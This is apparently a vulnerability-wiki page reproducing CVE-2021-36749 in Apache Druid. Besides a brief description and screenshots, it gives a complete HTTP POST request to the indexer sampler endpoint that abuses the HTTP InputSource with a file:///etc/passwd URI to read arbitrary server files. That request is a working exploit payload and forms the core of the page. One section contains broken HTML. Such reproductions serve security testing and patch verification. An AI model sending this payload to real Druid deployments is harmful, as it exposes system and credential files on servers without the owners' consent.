---
title: Apache Druid LoadData Arbitrary file reading vulnerability CVE-2021-36749
---

# Apache Druid LoadData Arbitrary file reading vulnerability CVE-2021-36749

## Vulnerability Description

Since there is no limit on the user specifying HTTP InputSource, application-level restrictions can be bypassed by passing the file URL to HTTP InputSource. 

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Apache Druid</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">
<a-button href="https://github.com/">title="Apache Druid"</a-button>
</a-checkbox>

## Vulnerability reappears

Main page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1635581825740-fb87d406-6cf5-4c7f-b757-66e83d957346.png)

Reproduction process

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1635581875371-557354af-d294-49ab-9483-79180aadfe65.png)

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1635581900223-41408c4c-3b5c-4b66-b726-532835d0254d.png)

The request package is

```php
POST /druid/indexer/v1/sampler?for=connect
Accept: application/json, text/plain, */*

{"type":"index","spec":{"type":"index","ioConfig":{"type":"index","inputSource":{"type":"http","uris":["file:///etc/passwd"]},"inputFormat":{"type":"regex","pattern":"(.*)","columns":["raw"]}},"dataSchema":{"dataSource":"sample","timestampSpec":{"column":"!!!_no_such_column_!!!","missingValue":"1970-01-01T00:00:00Z"},"dimensionsSpec":{}},"tuningConfig":{"type":"index"}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1635582099772-ea2fb699-82d9-4df1-aea9-9ed1f9068ae3.png)